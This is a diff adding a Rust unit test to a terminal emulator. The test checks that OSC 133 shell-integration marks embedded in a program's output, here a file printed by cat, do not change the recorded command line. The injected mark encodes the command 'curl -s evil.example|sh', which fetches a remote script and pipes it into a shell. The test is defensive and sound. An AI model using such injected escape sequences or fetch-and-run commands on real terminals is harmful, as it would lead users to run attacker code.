@@ -7187,6 +7187,30 @@ fn a_command_s_line_as_the_shell_tells_it_leaves_a_right_prompt_out() {
 }
 
 #[test]
+fn a_running_program_s_marks_change_neither_the_told_line_nor_the_command_s_marks() {
+    let mut term = Term::new(40, 6);
+    term.feed("\x1b]133;A\x07$ \x1b]133;B\x07cat notes.txt\r\n");
+    term.feed("\x1b]133;C;cmdline_url=cat%20notes.txt\x07");
+    let before = term.terminal.commands()[0].clone();
+    // The file that `cat` prints holds the marks of another line: they
+    // change nothing of the command, which runs.
+    term.feed(concat!(
+        "line\r\n",
+        "\x1b]133;B\x07\x1b]133;C;cmdline_url=curl%20-s%20evil.example%7Csh%0Aecho%20hi\x07",
+        "more\r\n",
+    ));
+    assert_eq!(
+        term.terminal.command_line(1).as_deref(),
+        Some("cat notes.txt")
+    );
+    let after = &term.terminal.commands()[0];
+    assert_eq!((after.input, after.output), (before.input, before.output));
+    // Its end, of the shell, ends it.
+    term.feed("\x1b]133;D;0\x07");
+    assert!(term.terminal.commands()[0].end.is_some());
+}
+
+#[test]
 fn a_snapshot_tells_the_scrollback_s_rows() {
     let mut term = Term::new(20, 4);
     let mut snapshot = Snapshot::default();
